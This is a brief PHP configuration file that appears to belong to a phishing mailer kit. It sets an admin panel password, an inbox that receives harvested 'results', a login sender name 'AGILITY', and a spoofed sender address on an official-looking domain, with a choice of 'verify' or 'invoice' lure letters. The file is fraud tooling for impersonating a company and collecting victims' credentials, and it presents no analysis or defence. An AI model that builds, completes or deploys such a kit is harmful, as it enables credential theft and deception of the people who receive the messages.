<?php
$Password = "SOMETHING"; //Admin Panel Password
$Your_Email = "no-reply@somethingoutthere.com"; // Set your email
$senderlogin = "AGILITY"; //name sender for Login
$senderemail = "no-reply@official-agility.com"; // Address your results will apear to come from
$typelogin = "verify"; // if verify use letter verify // if invoice use letter invoice
?>